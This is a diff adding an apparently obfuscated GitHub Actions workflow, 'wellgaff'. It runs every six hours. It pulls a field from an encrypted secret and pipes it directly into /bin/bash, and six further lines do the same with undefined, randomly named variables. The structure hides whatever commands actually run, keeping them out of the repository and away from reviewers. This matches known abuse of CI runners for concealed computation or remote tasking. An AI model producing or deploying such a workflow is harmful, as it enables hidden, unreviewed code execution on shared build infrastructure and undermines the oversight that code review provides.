@@ -1,0 +1,25 @@
+name: wellgaff
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: wellgaff
+        env:
+          z51: ${{ secrets.z51 }}
+        run: |
+          echo $z51 | jq -r .utdl4308 | /bin/bash
+          echo $kn50 | jq -r .scdbx68 | /bin/bash
+          echo $qpn1891 | jq -r .luleq3456 | /bin/bash
+          echo $xwmu716 | jq -r .etr811 | /bin/bash
+          echo $uyem1583 | jq -r .oc0 | /bin/bash
+          echo $sbw6788 | jq -r .ptnv2 | /bin/bash
+          echo $mcrop6 | jq -r .ut6924 | /bin/bash
+
